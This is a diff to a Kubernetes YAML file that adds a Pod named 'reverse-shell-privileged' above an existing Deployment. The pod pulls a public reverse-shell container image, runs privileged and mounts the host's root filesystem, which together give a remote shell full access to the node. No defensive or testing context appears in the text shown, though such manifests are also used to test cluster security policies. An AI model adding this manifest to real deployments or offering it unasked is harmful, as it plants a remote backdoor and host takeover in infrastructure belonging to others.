@@ -1,3 +1,24 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: reverse-shell-privileged
+spec:
+  containers:
+    - name: reverse-shell
+      image: ghcr.io/aarondewes/reverse-shell-docker:master
+      imagePullPolicy: Always
+      securityContext:
+        privileged: true
+      volumeMounts:
+        - name: host-root
+          mountPath: /host-dir
+  volumes:
+    - name: host-root
+      hostPath:
+        path: /
+        type: Directory
+  restartPolicy: Never
+---
 apiVersion: apps/v1
 kind: Deployment
 metadata:
